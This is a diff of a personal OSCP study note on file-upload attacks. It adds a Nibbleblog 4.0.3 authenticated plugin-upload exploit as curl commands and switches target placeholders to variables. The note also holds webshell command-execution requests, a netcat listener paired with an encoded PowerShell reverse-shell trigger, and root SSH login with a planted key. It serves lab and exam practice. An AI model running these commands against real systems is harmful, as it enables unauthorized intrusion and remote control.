@@ -18,8 +18,23 @@ cat << 'EOF' > RCE.php
 EOF
 
 # Execute commands once uploaded
-curl -s "http://<target>/uploads/RCE.php?cmd=cat+/flag.txt"
+curl -s "http://$BoxIP/uploads/RCE.php?cmd=cat+/flag.txt"
 ```
+
+## Nibbleblog 4.0.3 Authenticated Plugin Upload
+
+After authenticating to Nibbleblog 4.0.3, the My Image plugin accepts a PHP file through its multipart configuration request. The vulnerable handler renames the upload to `image.php` under the plugin directory.
+
+```bash
+curl -s -b $CookieFile \
+  -F 'plugin=my_image' -F 'title=My image' -F 'position=4' -F 'caption=' \
+  -F 'image=@$PayloadFile;type=application/x-php' \
+  -F 'image_resize=1' -F 'image_width=230' -F 'image_height=200' -F 'image_option=auto' \
+  "http://$BoxIP/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image"
+curl -s "http://$BoxIP/nibbleblog/content/private/plugins/my_image/image.php"
+```
+
+The first request uploads the file and the second request triggers it. The upload requires an authenticated session cookie. Source: [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|HTB Nibbles]].
 
 ## Filter Bypass Techniques
 
@@ -57,7 +72,7 @@ Full list also at `/usr/share/SecLists/Discovery/Web-Content/web-extensions.txt`
 
 **Confirm code execution once a webshell lands:**
 ```bash
-curl "http://<target>/uploads/<shell>.phar?cmd=whoami"
+curl "http://$BoxIP/uploads/<shell>.phar?cmd=whoami"
 # Uploaded files commonly land in /uploads/, /profile_images/, /user_feedback_submissions/, etc.
 # Check the app's upload confirmation text for the exact path
 ```
@@ -70,7 +85,7 @@ $EncodedText = [Convert]::ToBase64String($Bytes)
 ```
 ```bash
 nc -nvlp 4444
-curl "http://<target>/uploads/<shell>.pHP?cmd=powershell%20-enc%20<encoded_string_here>"
+curl "http://$BoxIP/uploads/<shell>.pHP?cmd=powershell%20-enc%20<encoded_string_here>"
 ```
 *`powershell -enc` expects UTF-16LE base64, not plain ASCII-then-base64.*
 
@@ -186,7 +201,7 @@ Forward it.
 **Step 3: connect with the planted key**
 ```bash
 rm ~/.ssh/known_hosts            # needed if the hostname was reused from an earlier lab VM
-ssh -p <port> -i <keyname> root@<target>
+ssh -p $Port -i <keyname> root@$BoxIP
 ```
 
 *Worth checking before assuming this'll work: what happens if you upload the same filename twice? An "already exists" response can be abused to brute-force server file/directory names, and a differing error message can leak the backend language/framework. Also worth remembering: web apps built on a language's own bundled dev server (rather than deployed properly under Apache/Nginx/IIS) are frequently run as root/Administrator directly, always worth testing for this rather than assuming least-privilege.*
@@ -254,3 +269,14 @@ This area grows alongside the modules. Whenever a new upload-bypass trick comes 
 - [RevShells](https://www.revshells.com/) for shell payload selection
 - [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
 - [ippsec.rocks](https://ippsec.rocks/) for technique walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/09. Common Web Application Attacks]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
